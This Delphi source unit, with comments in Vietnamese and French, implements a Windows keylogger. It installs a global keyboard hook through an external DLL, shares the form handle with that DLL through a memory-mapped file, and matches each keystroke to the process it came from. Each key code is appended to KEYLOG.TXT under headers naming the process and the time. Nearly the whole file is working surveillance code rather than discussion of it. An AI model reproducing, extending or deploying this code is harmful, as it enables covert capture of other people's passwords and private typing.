unit Key;

interface

uses
	Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms,
	Dialogs, StdCtrls, ExtCtrls, hook;

type
	PKeyBuffer = ^TKeyBuffer;

	TKeyBuffer = record
		kbIN: Integer;
		kbOUT: Integer;
		kbKEY: array [0 .. 127] of Integer;
		kbID: array [0 .. 127] of Integer;
	end;

var
	HandleHook: Integer = 0;
	HandleFile: Integer = 0;
	Pointeur: PKeyBuffer = nil;

procedure Khoi_tao_key(form: TForm);
procedure Dong_key;

var
	idmsg: Cardinal; // Thông tin liên lạc ID msg
	lastpross: string;
	ListeProcess: TStrings; // Biến có chứa danh sách các quá trình hiện tại
	Fichier: TextFile; // Biến có chứa các tập tin văn bản được viết

procedure psavetofile(); forward;

implementation

uses tlHelp32;

function fStrToWrite(Key: Integer; nom: string; var Tra_ve_chuoi: string)
	: Boolean; forward;

// ========================================
function fStrToWrite(Key: Integer; nom: string;
	var Tra_ve_chuoi: string): Boolean;
var
	phim: string;
begin
	if Key >= 0 then
	begin
		if Key = 18 then
			phim := 'Alt'
		else if Key = 17 then
			phim := 'Ctrl'
		else if Key = 16 then
			phim := 'Shift'
		else if Key = 91 then
			phim := 'WinDow'
		else if Key = 9 then
			phim := 'Tab'
		else if Key = 20 then
			phim := 'Caps Lock'
		else if Key = 13 then
			phim := 'Enter'
		else if Key = 8 then
			phim := 'Backspace'
		else if Key = 86 then
			phim := 'Del'
		else if Key = 112 then
			phim := 'F1'
		else
			phim := chr(Key);
		Tra_ve_chuoi := IntToStr(Key) + ' = ' + phim;
		fStrToWrite := true;
	end
	else
		fStrToWrite := false;
end;

// ------------------------------------------------------------------------------
// ========================================
// Làm thế nào để cập nhật danh sách các quá trình
// Nó được gọi là mỗi lần một IdProcess không hề có trong danh sách hiện hành
procedure MiseAJourListeProcess;
var
	h: Integer;
	me32: TProcessEntry32;

begin
	ListeProcess.Clear;
	h := CreateToolHelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	me32.dwSize := sizeof(me32);
	if Process32First(h, me32) then
	begin
		repeat
			ListeProcess.Add(IntToHex(me32.th32ProcessID, 8) +
				UpperCase(ExtractFileName(StrPas(me32.szExeFile))));
		until not Process32Next(h, me32);
	end;
	CloseHandle(h);
end;
// ========================================

function ChercheNomProcess(ProcessId: Cardinal): string;
var
	i: Integer;
	Chaine: string;

begin
	Result := '';
	Chaine := IntToHex(ProcessId, 8);
	for i := 0 to ListeProcess.Count - 1 do
	begin
		if Copy(ListeProcess[i], 1, 8) = Chaine then
		begin
			Result := Copy(ListeProcess[i], 9, Length(ListeProcess[i]) - 8);
			Break;
		end;
	end;
end;
// ========================================

procedure psavetofile(); // lưu tổ hợp phím
var
	ProcessId: Integer;
	Key: Integer;
	Ten_file_exe: string;
	towrite: string;
begin
	// Là một quan trọng là hiện tại ...
	while GetNextKey(Key, ProcessId) do
	begin
		// ... on cherche le nom de l'EXE ...
		Ten_file_exe := ChercheNomProcess(ProcessId);
		if Ten_file_exe = '' then
		begin
			// nếu tình cờ nó là một quá trình mới
			// Chúng tôi cập nhật danh sách và chúng tôi cố gắng một lần nữa ...
			MiseAJourListeProcess;
			Ten_file_exe := ChercheNomProcess(ProcessId);
			if Ten_file_exe = '' then
				Ten_file_exe := '<INCONNU>';
		end;

		// ... enfin on stock la touche dans le fichier.
		if (fStrToWrite(Key, Ten_file_exe, towrite)) then
		begin
			if lastpross = Ten_file_exe then
			begin
				WriteLn(Fichier, towrite);
				// f_key.Edit1.Text:= towrite;
			end
			else
			begin
				WriteLn(Fichier, '-------------------------------------------------');
				WriteLn(Fichier, Ten_file_exe + ' - ' + TimeToStr(Time));
				WriteLn(Fichier, '-------------------------------------------------');
				WriteLn(Fichier, towrite);
				lastpross := Ten_file_exe;
			end;
		end;
	end;
end;

// ========================================
procedure Khoi_tao_key(form: TForm);
var
	PointeurLocal: ^hwnd;
begin
	idmsg := RegisterWindowMessage('MY_CDOPEN'); // enregistre le new msg

	// mappage ds la mémoire pour le passage du handle de la form a la dll
	HandleFile := CreateFileMapping($FFFFFFFF, nil, PAGE_READWRITE, 0,
		sizeof(hwnd), 'HWNDFORM');
	if HandleFile <> 0 then
	begin
		PointeurLocal := MapViewOfFile(HandleFile, FILE_MAP_WRITE, 0, 0, 0);
		if PointeurLocal <> nil then
			PointeurLocal^ := form.handle
		else
		begin
			Showmessage('Erreur de mappage hwndform');
			Application.Terminate;
		end;
	end
	else
	begin
		Showmessage('Erreur de mappage hwndform');
		Application.Terminate;
	end;
	// -------------------------------------------------------------------

	lastpross := '';
	AssignFile(Fichier, 'KEYLOG.TXT');
	if FileExists('KEYLOG.TXT') then
		Append(Fichier)
	else
		Rewrite(Fichier);
	// Lancement du hook
	if not StartHook then
	begin
		Showmessage('Erreur de lancement du HOOK');
		Application.Terminate;
	end;
	ListeProcess := TStringList.Create;
end;

// ========================================
procedure Dong_key;
begin
	ListeProcess.Free;
	StopHook;
	// CloseFile(Fichier);
end;

end.
